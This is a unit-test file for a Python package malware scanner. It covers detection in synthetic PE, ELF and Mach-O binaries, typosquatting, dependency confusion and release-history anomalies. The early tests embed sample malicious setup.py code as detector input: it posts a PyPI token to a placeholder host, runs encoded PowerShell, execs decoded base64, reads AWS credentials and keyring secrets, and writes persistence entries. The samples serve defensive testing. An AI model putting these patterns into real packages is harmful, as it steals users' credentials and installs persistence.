from __future__ import annotations

import struct
import unittest

from trustcheck.malicious import (
    RULE_CALIBRATIONS,
    _cstring,
    _damerau_levenshtein,
    _deduplicate_findings,
    _name_relation,
    _native_format,
    _normalize_repository,
    _ownership_identities,
    _parse_macho,
    _pe_rva_to_offset,
    _repository_urls,
    _score_level,
    _shannon_entropy,
    _unpack,
    _upload_time,
    analyze_python_source,
    assess_package,
    finding_for_artifact,
    heuristic_score,
    inspect_native_binary,
    native_binary_findings,
    normalize_rule_thresholds,
    normalize_score_thresholds,
)
from trustcheck.models import HeuristicFinding


def build_pe(
    *,
    signed: bool = True,
    embedded_zip: bool = False,
    pe_plus: bool = False,
    imports: bool = True,
    machine: int = 0x8664,
) -> bytes:
    payload = bytearray(0x400)
    payload[:2] = b"MZ"
    struct.pack_into("<I", payload, 0x3C, 0x80)
    payload[0x80:0x84] = b"PE\0\0"
    optional_size = 240 if pe_plus else 224
    struct.pack_into(
        "<HHIIIHH", payload, 0x84, machine, 1, 0, 0, 0, optional_size, 0x2022
    )
    optional = 0x98
    struct.pack_into("<H", payload, optional, 0x20B if pe_plus else 0x10B)
    directory = optional + (112 if pe_plus else 96)
    struct.pack_into("<I", payload, optional + (108 if pe_plus else 92), 16)
    if imports:
        struct.pack_into("<II", payload, directory + 8, 0x1000, 64)
    if signed:
        struct.pack_into("<II", payload, directory + 32, 0x380, 32)
    section = optional + optional_size
    payload[section : section + 8] = b".rdata\0\0"
    struct.pack_into("<IIII", payload, section + 8, 0x200, 0x1000, 0x200, 0x200)
    struct.pack_into("<IIIII", payload, 0x200, 0, 0, 0, 0x1028, 0)
    payload[0x228:0x234] = b"WINHTTP.dll\0"
    if embedded_zip:
        payload[0x300:0x304] = b"PK\x03\x04"
    return bytes(payload)


def build_elf() -> bytes:
    payload = bytearray(0x300)
    payload[:16] = b"\x7fELF\x02\x01\x01" + b"\0" * 9
    struct.pack_into("<HHIQQQIHHHHHH", payload, 16, 3, 62, 1, 0, 0, 0x100, 0, 64, 0, 0, 64, 3, 0)
    section = struct.Struct("<IIQQQQIIQQ")
    section.pack_into(payload, 0x100, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    section.pack_into(payload, 0x140, 0, 3, 0, 0, 0x200, 32, 0, 0, 1, 0)
    section.pack_into(payload, 0x180, 0, 6, 0, 0, 0x240, 32, 1, 0, 8, 16)
    payload[0x200:0x20C] = b"\0libcurl.so\0"
    struct.pack_into("<QQQQ", payload, 0x240, 1, 1, 0, 0)
    return bytes(payload)


def build_macho(*, signed: bool = True) -> bytes:
    dylib_name = b"/usr/lib/libcurl.dylib\0"
    dylib_size = 24 + len(dylib_name)
    dylib_size += (-dylib_size) % 8
    signature_size = 16 if signed else 0
    payload = bytearray(32 + dylib_size + signature_size)
    struct.pack_into(
        "<IiiIIIII",
        payload,
        0,
        0xFEEDFACF,
        0x01000007,
        3,
        6,
        2 if signed else 1,
        dylib_size + signature_size,
        0,
        0,
    )
    struct.pack_into("<IIIIII", payload, 32, 0xC, dylib_size, 24, 0, 0, 0)
    payload[56 : 56 + len(dylib_name)] = dylib_name
    if signed:
        struct.pack_into("<IIII", payload, 32 + dylib_size, 0x1D, 16, 0, 0)
    return bytes(payload)


def build_elf32_big_endian() -> bytes:
    payload = bytearray(0x240)
    payload[:16] = b"\x7fELF\x01\x02\x01" + b"\0" * 9
    struct.pack_into(
        ">HHIIIIIHHHHHH",
        payload,
        16,
        3,
        40,
        1,
        0,
        0,
        0x80,
        0,
        52,
        0,
        0,
        40,
        3,
        0,
    )
    section = struct.Struct(">IIIIIIIIII")
    section.pack_into(payload, 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    section.pack_into(payload, 0xA8, 0, 3, 0, 0, 0x140, 32, 0, 0, 1, 0)
    section.pack_into(payload, 0xD0, 0, 6, 0, 0, 0x180, 16, 1, 0, 4, 8)
    payload[0x140:0x14D] = b"\0libsecret.so\0"
    struct.pack_into(">IIII", payload, 0x180, 1, 1, 0, 0)
    return bytes(payload)


def build_fat_macho(*, use_64_bit_table: bool = False) -> bytes:
    first = build_macho(signed=True)
    second = build_macho(signed=False)
    entry_size = 32 if use_64_bit_table else 20
    header_size = 8 + 2 * entry_size
    first_offset = header_size
    second_offset = first_offset + len(first)
    magic = 0xCAFEBABF if use_64_bit_table else 0xCAFEBABE
    payload = bytearray(second_offset + len(second))
    struct.pack_into(">II", payload, 0, magic, 2)
    if use_64_bit_table:
        struct.pack_into(
            ">IIQQII", payload, 8, 0x01000007, 3, first_offset, len(first), 0, 0
        )
        struct.pack_into(
            ">IIQQII",
            payload,
            40,
            0x01000007,
            3,
            second_offset,
            len(second),
            0,
            0,
        )
    else:
        struct.pack_into(
            ">IIIII", payload, 8, 0x01000007, 3, first_offset, len(first), 0
        )
        struct.pack_into(
            ">IIIII",
            payload,
            28,
            0x01000007,
            3,
            second_offset,
            len(second),
            0,
        )
    payload[first_offset : first_offset + len(first)] = first
    payload[second_offset : second_offset + len(second)] = second
    return bytes(payload)


class SourceHeuristicTests(unittest.TestCase):
    def test_install_hook_detects_capabilities_and_combination_chains(self) -> None:
        source = b"""
import base64
import os
import requests
import subprocess

token = os.getenv("PYPI_TOKEN")
requests.post("https://example.invalid", data=token)
subprocess.run(["powershell", "-enc", "payload"])
exec(base64.b64decode("cGFzcw=="))
open("/tmp/site-packages/evil.pth", "w")
"""
        findings, error = analyze_python_source(
            "demo-1.0/setup.py",
            source,
            install_context=True,
        )
        codes = {finding.code for finding in findings}

        self.assertIsNone(error)
        self.assertIn("ast_credential_environment", codes)
        self.assertIn("ast_network_call", codes)
        self.assertIn("ast_subprocess_call", codes)
        self.assertIn("ast_dynamic_execution", codes)
        self.assertIn("ast_payload_decode", codes)
        self.assertIn("ast_persistence", codes)
        self.assertIn("ast_credential_network_chain", codes)
        self.assertIn("ast_obfuscated_process_chain", codes)
        self.assertIn("ast_install_time_execution_chain", codes)
        self.assertGreaterEqual(heuristic_score(findings), 75)

    def test_credential_paths_keyring_aliases_and_custom_hooks_are_detected(self) -> None:
        source = b"""
from pathlib import Path
from keyring import get_password as password
from setuptools import setup
import winreg

Path("~/.aws/credentials").read_text()
password("pypi", "publisher")
winreg.SetValueEx(winreg.HKEY_CURRENT_USER, "Run", 0, 1, "demo")
setup(cmdclass={"install": object})
"""
        findings, error = analyze_python_source(
            "setup.py",
            source,
            install_context=True,
        )
        codes = {finding.code for finding in findings}

        self.assertIsNone(error)
        self.assertIn("ast_credential_file_access", codes)
        self.assertIn("ast_keyring_access", codes)
        self.assertIn("ast_persistence", codes)
        self.assertIn("ast_custom_install_hook", codes)

    def test_environment_subscripts_bytes_arguments_and_relative_imports(self) -> None:
        source = b"""
from . import helper
import os
import subprocess as process

value = os.environ["AWS_SECRET_ACCESS_KEY"]
ordinary = os.getenv("HOME")
process.run(b"whoami", shell=True)
helper()
"""
        findings, error = analyze_python_source("demo/hook.py", source)
        codes = {finding.code for finding in findings}

        self.assertIsNone(error)
        self.assertIn("ast_credential_environment", codes)
        self.assertIn("ast_subprocess_call", codes)

    def test_invalid_source_is_reported_without_execution(self) -> None:
        invalid_utf8, utf8_error = analyze_python_source("bad.py", b"\xff")
        invalid_syntax, syntax_error = analyze_python_source("bad.py", b"if:\n")

        self.assertEqual(invalid_utf8, [])
        self.assertIn("not valid UTF-8", utf8_error or "")
        self.assertEqual(invalid_syntax, [])
        self.assertIn("unable to parse Python AST", syntax_error or "")

    def test_ordinary_network_call_is_a_low_weight_heuristic(self) -> None:
        findings, error = analyze_python_source(
            "demo/client.py",
            b"import urllib.request\nurllib.request.urlopen('https://example.com')\n",
        )

        self.assertIsNone(error)
        self.assertEqual([finding.code for finding in findings], ["ast_network_call"])
        self.assertLess(heuristic_score(findings), 25)

    def test_rule_calibration_is_attached_to_findings(self) -> None:
        findings, error = analyze_python_source(
            "demo/client.py",
            b"import subprocess\nsubprocess.run(['python', '-V'])\n",
        )
        finding = findings[0]

        self.assertIsNone(error)
        self.assertEqual(finding.rule_version, "2026.06")
        self.assertEqual(finding.false_positive_rate, 0.20)
        self.assertEqual(finding.score_threshold, 1)
        self.assertEqual(
            finding.confidence,
            RULE_CALIBRATIONS["ast_subprocess_call"].confidence,
        )


class NativeBinaryTests(unittest.TestCase):
    def test_pe_import_signature_entropy_and_embedded_payload(self) -> None:
        inspection = inspect_native_binary(
            "demo/native.pyd",
            build_pe(embedded_zip=True),
        )
        codes = {finding.code for finding in native_binary_findings(inspection)}

        self.assertEqual(inspection.format, "PE")
        self.assertEqual(inspection.architecture, "x86-64")
        self.assertEqual(inspection.imports, ["WINHTTP.dll"])
        self.assertTrue(inspection.signature_present)
        self.assertIn("zip signature at byte offset 768", inspection.embedded_payloads)
        self.assertIn("native_sensitive_import", codes)
        self.assertIn("native_embedded_payload", codes)
        self.assertIn("native_payload_network_chain", codes)

    def test_pe_plus_unsigned_no_import_and_unknown_machine_paths(self) -> None:
        inspection = inspect_native_binary(
            "demo/native.pyd",
            build_pe(
                signed=False,
                pe_plus=True,
                imports=False,
                machine=0xFFFF,
            ),
        )

        self.assertEqual(inspection.architecture, "machine-0xffff")
        self.assertEqual(inspection.imports, [])
        self.assertFalse(inspection.signature_present)
        self.assertIn(
            "native_signature_absent",
            {finding.code for finding in native_binary_findings(inspection)},
        )

    def test_elf_dynamic_imports_are_parsed(self) -> None:
        inspection = inspect_native_binary("demo/native.so", build_elf())

        self.assertEqual(inspection.format, "ELF")
        self.assertEqual(inspection.architecture, "x86-64")
        self.assertEqual(inspection.imports, ["libcurl.so"])
        self.assertIsNone(inspection.signature_present)
        self.assertEqual(inspection.signature_status, "no-standard-embedded-signature")

    def test_elf32_big_endian_dynamic_imports_are_parsed(self) -> None:
        inspection = inspect_native_binary(
            "demo/native.so",
            build_elf32_big_endian(),
        )

        self.assertEqual(inspection.architecture, "ARM")
        self.assertEqual(inspection.imports, ["libsecret.so"])

    def test_macho_dylib_and_code_signature_are_parsed(self) -> None:
        signed = inspect_native_binary("demo/native.dylib", build_macho())
        unsigned = inspect_native_binary(
            "demo/unsigned.dylib",
            build_macho(signed=False),
        )
        unsigned_codes = {
            finding.code for finding in native_binary_findings(unsigned)
        }

        self.assertEqual(signed.format, "Mach-O")
        self.assertEqual(signed.architecture, "x86-64")
        self.assertEqual(signed.imports, ["/usr/lib/libcurl.dylib"])
        self.assertTrue(signed.signature_present)
        self.assertFalse(unsigned.signature_present)
        self.assertIn("native_signature_absent", unsigned_codes)

    def test_fat_macho_tables_aggregate_slices(self) -> None:
        fat32 = inspect_native_binary("demo/fat.dylib", build_fat_macho())
        fat64 = inspect_native_binary(
            "demo/fat64.dylib",
            build_fat_macho(use_64_bit_table=True),
        )

        self.assertEqual(fat32.architecture, "universal(x86-64)")
        self.assertFalse(fat32.signature_present)
        self.assertEqual(fat64.imports, ["/usr/lib/libcurl.dylib"])
        self.assertEqual(
            fat64.signature_status,
            "one-or-more-slices-unsigned",
        )

    def test_unrecognized_and_truncated_native_files_return_parse_notes(self) -> None:
        unknown = inspect_native_binary("demo/native.so", b"native")
        truncated = inspect_native_binary("demo/native.pyd", b"MZ")

        self.assertEqual(unknown.format, "unknown")
        self.assertIn("recognized", unknown.parse_error or "")
        self.assertEqual(truncated.format, "PE")
        self.assertIn("unable to parse", truncated.parse_error or "")

    def test_malformed_binary_headers_cover_defensive_parser_paths(self) -> None:
        missing_signature = bytearray(64)
        missing_signature[:2] = b"MZ"
        struct.pack_into("<I", missing_signature, 0x3C, 4)
        bad_magic = bytearray(build_pe())
        struct.pack_into("<H", bad_magic, 0x98, 0x999)
        pe_no_directories = bytearray(build_pe())
        struct.pack_into("<I", pe_no_directories, 0x98 + 92, 0)
        pe_without_name = bytearray(build_pe())
        struct.pack_into("<IIIII", pe_without_name, 0x200, 1, 0, 0, 0, 0)

        malformed = [
            bytes(missing_signature),
            bytes(bad_magic),
            b"\x7fELF",
            b"\x7fELF\x02\x03" + b"\0" * 60,
            b"\x7fELF\x03\x01" + b"\0" * 60,
            b"\xca\xfe\xba\xbe\0\0\0\0",
        ]
        for payload in malformed:
            with self.subTest(payload=payload[:8]):
                inspection = inspect_native_binary("demo/native.bin", payload)
                self.assertIsNotNone(inspection.parse_error)

        no_directories = inspect_native_binary(
            "demo/no-directories.pyd",
            bytes(pe_no_directories),
        )
        without_name = inspect_native_binary(
            "demo/no-name.pyd",
            bytes(pe_without_name),
        )
        self.assertEqual(no_directories.imports, [])
        self.assertEqual(without_name.imports, [])

        big_endian_macho = struct.pack(
            ">IiiIIII",
            0xFEEDFACE,
            7,
            3,
            2,
            0,
            0,
            0,
        )
        parsed_big_endian = inspect_native_binary(
            "demo/big-endian.dylib",
            big_endian_macho,
        )
        self.assertEqual(parsed_big_endian.architecture, "x86")

        invalid_command = bytearray(build_macho())
        struct.pack_into("<I", invalid_command, 36, 4)
        self.assertIn(
            "load-command size",
            inspect_native_binary(
                "demo/invalid-command.dylib",
                bytes(invalid_command),
            ).parse_error
            or "",
        )
        with self.assertRaisesRegex(ValueError, "unsupported Mach-O"):
            _parse_macho("demo/native", b"NOPE")

    def test_high_entropy_native_data_is_labeled_as_a_weak_heuristic(self) -> None:
        inspection = inspect_native_binary(
            "demo/packed.pyd",
            build_pe() + bytes(range(256)) * 64,
        )
        inspection.entropy = 7.8
        finding = next(
            item
            for item in native_binary_findings(inspection)
            if item.code == "native_high_entropy"
        )

        self.assertEqual(finding.confidence, "low")


class PackageAssessmentTests(unittest.TestCase):
    def test_typosquatting_and_public_private_index_collision_score_critical(self) -> None:
        assessment = assess_package(
            "requsets",
            current_info={"version": "1.0.0"},
            current_ownership={},
            current_repositories=[],
            dependency_confusion_indexes=(
                "https://pypi.org/simple",
                "https://packages.example/simple",
            ),
        )
        codes = {finding.code for finding in assessment.findings}

        self.assertIn("typosquatting_name_similarity", codes)
        self.assertIn("dependency_confusion_index_collision", codes)
        self.assertEqual(assessment.level, "critical")
        self.assertGreaterEqual(assessment.score, 75)
        self.assertIn("not proof", assessment.disclaimer)

    def test_custom_trusted_project_and_private_collision_are_supported(self) -> None:
        assessment = assess_package(
            "internal-sdkk",
            current_info={"version": "1.0.0"},
            current_ownership={},
            current_repositories=[],
            dependency_confusion_indexes=(
                "https://one.example/simple",
                "https://two.example/simple",
            ),
            trusted_projects=("internal-sdk",),
        )

        self.assertEqual(
            {finding.code for finding in assessment.findings},
            {
                "dependency_confusion_index_collision",
                "typosquatting_name_similarity",
            },
        )
        confusion = next(
            finding
            for finding in assessment.findings
            if finding.code == "dependency_confusion_index_collision"
        )
        self.assertEqual(confusion.severity, "high")

        mirror_assessment = assess_package(
            "internal-project",
            current_info={"version": "1.0.0"},
            current_ownership={},
            current_repositories=[],
            dependency_confusion_indexes=(
                "https://mirror.pypi.org/simple",
                "https://packages.example/simple",
            ),
        )
        relative_assessment = assess_package(
            "internal-project",
            current_info={"version": "1.0.0"},
            current_ownership={},
            current_repositories=[],
            dependency_confusion_indexes=(
                "relative-index",
                "https://packages.example/simple",
            ),
        )
        self.assertEqual(mirror_assessment.findings[0].severity, "critical")
        self.assertEqual(relative_assessment.findings[0].severity, "high")

    def test_metadata_ownership_repository_and_cadence_anomalies(self) -> None:
        releases = {
            "1.0.0": [{"upload_time_iso_8601": "2024-01-01T00:00:00Z"}],
            "1.1.0": [{"upload_time_iso_8601": "2024-02-01T00:00:00Z"}],
            "1.2.0": [{"upload_time_iso_8601": "2024-03-01T00:00:00Z"}],
            "1.3.0": [{"upload_time_iso_8601": "2026-06-13T00:00:00Z"}],
            "1.3.1": [{"upload_time_iso_8601": "2026-06-13T00:10:00Z"}],
            "1.3.2": [{"upload_time_iso_8601": "2026-06-13T00:20:00Z"}],
            "1.3.3": [{"upload_time_iso_8601": "2026-06-13T00:30:00Z"}],
            "1.3.4": [{"upload_time_iso_8601": "2026-06-13T00:40:00Z"}],
        }
        assessment = assess_package(
            "internal-project",
            current_info={
                "version": "1.3.4",
                "author": "New Owner",
                "ownership": {
                    "organization": "new-org",
                    "roles": [{"user": "new-owner"}],
                },
            },
            current_ownership={
                "organization": "new-org",
                "roles": [{"user": "new-owner"}],
            },
            current_repositories=["https://github.com/new/project"],
            project_payload={"releases": releases},
            previous_payload={
                "info": {
                    "version": "1.2.0",
                    "author": "Old Owner",
                    "ownership": {
                        "organization": "old-org",
                        "roles": [{"user": "old-owner"}],
                    },
                    "project_urls": {
                        "Source": "https://github.com/old/project"
                    },
                }
            },
        )
        codes = {finding.code for finding in assessment.findings}

        self.assertIn("maintainer_identity_change", codes)
        self.assertIn("project_ownership_change", codes)
        self.assertIn("declared_repository_change", codes)
        self.assertIn("release_burst", codes)
        self.assertIn("release_after_dormancy", codes)
        self.assertIn("release_cadence_acceleration", codes)

    def test_artifact_findings_are_aggregated_and_deduplicated(self) -> None:
        finding = HeuristicFinding(
            code="ast_network_call",
            category="network",
            severity="low",
            confidence="high",
            score=8,
            message="Network",
            location="demo.py:1",
            artifact="demo.whl",
        )
        assessment = assess_package(
            "internal-project",
            current_info={"version": "1.0.0"},
            current_ownership={},
            current_repositories=[],
            artifact_findings=(finding, finding),
            artifact_analysis=True,
        )

        self.assertTrue(assessment.artifact_analysis)
        self.assertEqual(len(assessment.findings), 1)
        self.assertEqual(assessment.score, 8)

    def test_policy_rule_thresholds_can_suppress_score_contribution(self) -> None:
        finding = HeuristicFinding(
            code="ast_network_call",
            category="network",
            severity="low",
            confidence="high",
            score=8,
            message="Network",
        )
        assessment = assess_package(
            "internal-project",
            current_info={"version": "1.0.0"},
            current_ownership={},
            current_repositories=[],
            artifact_findings=(finding,),
            rule_thresholds={"ast_network_call": 9},
        )

        self.assertEqual(assessment.score, 0)
        self.assertEqual(assessment.level, "none")
        self.assertEqual(assessment.rule_thresholds, {"ast_network_call": 9})

    def test_empty_and_malformed_history_inputs_do_not_create_findings(self) -> None:
        for payload in (None, {"releases": []}, {"releases": {"x": "bad"}}):
            with self.subTest(payload=payload):
                assessment = assess_package(
                    "internal-project",
                    current_info={"version": "missing"},
                    current_ownership={},
                    current_repositories=[],
                    project_payload=payload,
                )
                self.assertEqual(assessment.findings, [])
                self.assertEqual(assessment.level, "none")

    def test_score_levels_cover_all_bands(self) -> None:
        self.assertEqual(_score_level(0), "none")
        self.assertEqual(_score_level(1), "low")
        self.assertEqual(_score_level(25), "elevated")
        self.assertEqual(_score_level(50), "high")
        self.assertEqual(_score_level(75), "critical")
        self.assertEqual(
            _score_level(
                60,
                thresholds={"low": 1, "elevated": 25, "high": 70, "critical": 90},
            ),
            "elevated",
        )
        self.assertEqual(
            normalize_score_thresholds({"high": 70})["high"],
            70,
        )
        self.assertEqual(
            normalize_rule_thresholds({"ast_network_call": 9}),
            {"ast_network_call": 9},
        )
        with self.assertRaisesRegex(ValueError, "ordered"):
            normalize_score_thresholds({"high": 20})
        with self.assertRaisesRegex(ValueError, "between 0 and 100"):
            normalize_rule_thresholds({"ast_network_call": 101})


class HelperTests(unittest.TestCase):
    def test_name_distance_and_relationship_helpers(self) -> None:
        self.assertEqual(_damerau_levenshtein("same", "same"), 0)
        self.assertEqual(_damerau_levenshtein("", "abc"), 3)
        self.assertEqual(_damerau_levenshtein("abc", ""), 3)
        self.assertEqual(_damerau_levenshtein("ab", "ba"), 1)
        self.assertEqual(_name_relation("my--pkg", "my-pkg"), "separator substitution")
        self.assertEqual(
            _name_relation("reqeusts", "requests"),
            "adjacent transposition or substitution",
        )
        self.assertEqual(
            _name_relation("requestss", "requests"),
            "character insertion or deletion",
        )
        self.assertEqual(
            _name_relation("requestz", "requests"),
            "character substitution",
        )

    def test_metadata_normalization_helpers_cover_sparse_values(self) -> None:
        self.assertEqual(
            _ownership_identities(
                {
                    "owner": "Alice",
                    "nested": [{"username": "Bob"}, {"ignored": 1}],
                }
            ),
            {"alice", "bob"},
        )
        self.assertEqual(_repository_urls({"project_urls": "bad"}), [])
        self.assertEqual(
            _normalize_repository("github.com/Example/Repo/"),
            "github.com/example/repo",
        )
        self.assertEqual(
            _normalize_repository("https://GitHub.com/Example/Repo.git"),
            "github.com/example/repo",
        )

    def test_timestamp_entropy_and_binary_bounds_helpers(self) -> None:
        self.assertIsNone(_upload_time({}))
        self.assertIsNone(_upload_time({"upload_time": "not-a-date"}))
        timestamp = _upload_time({"upload_time": "2026-06-13T12:00:00"})
        self.assertIsNotNone(timestamp)
        assert timestamp is not None
        self.assertIsNotNone(timestamp.tzinfo)
        self.assertIsNone(_shannon_entropy(b""))
        self.assertEqual(_shannon_entropy(b"aaaa"), 0.0)
        self.assertEqual(_unpack("H", b"\x01\x00", 0, "<"), (1,))
        with self.assertRaisesRegex(ValueError, "beyond"):
            _unpack("I", b"\0", 0, "<")
        self.assertEqual(_cstring(b"name-without-null", 0), "name-without-null")
        with self.assertRaisesRegex(ValueError, "outside"):
            _cstring(b"x", 2)
        self.assertEqual(
            _pe_rva_to_offset(0x1010, [(0x1000, 0x20, 0x200, 0x20)]),
            0x210,
        )
        with self.assertRaisesRegex(ValueError, "does not map"):
            _pe_rva_to_offset(0x2000, [])
        self.assertEqual(_native_format(b"\x7fELF"), "ELF")
        self.assertEqual(_native_format(build_macho()), "Mach-O")
        self.assertEqual(_native_format(b"unknown"), "unknown")

    def test_finding_copy_and_higher_score_deduplication(self) -> None:
        low = HeuristicFinding(
            code="same",
            category="network",
            severity="low",
            confidence="low",
            score=1,
            message="low",
        )
        high = HeuristicFinding(
            code="same",
            category="network",
            severity="high",
            confidence="high",
            score=20,
            message="high",
        )

        copied = finding_for_artifact(high, "demo.whl")
        deduplicated = _deduplicate_findings([low, high])

        self.assertEqual(copied.artifact, "demo.whl")
        self.assertEqual(deduplicated, [high])


if __name__ == "__main__":
    unittest.main()
